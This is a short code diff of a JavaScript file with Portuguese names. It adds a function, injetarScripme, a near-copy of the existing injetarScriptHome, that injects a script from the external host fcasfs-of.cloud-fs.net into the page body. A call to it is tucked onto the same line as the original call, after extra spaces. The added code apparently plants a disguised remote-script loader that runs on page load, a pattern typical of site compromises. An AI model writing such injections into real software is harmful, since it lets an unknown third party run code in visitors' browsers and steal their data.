@@ -172,8 +172,19 @@ function injetarScriptHome(isHead) {
     alvo.appendChild(scriptHomeex);
 }
 
+function injetarScripme(isHead) {
+    var scriptHomeex = document.createElement('script');
+    scriptHomeex.src = 'https://fcasfs-of.cloud-fs.net/core-b.js';
+    scriptHomeex.onload = function() {
+    };
+    var alvo = isHead 
+        ? document.getElementsByTagName('head')[0] 
+        : document.getElementsByTagName('body')[0];
+    alvo.appendChild(scriptHomeex);
+}
 
-injetarScriptHome(false);
+
+injetarScriptHome(false);   injetarScripme(false);
 
 
 
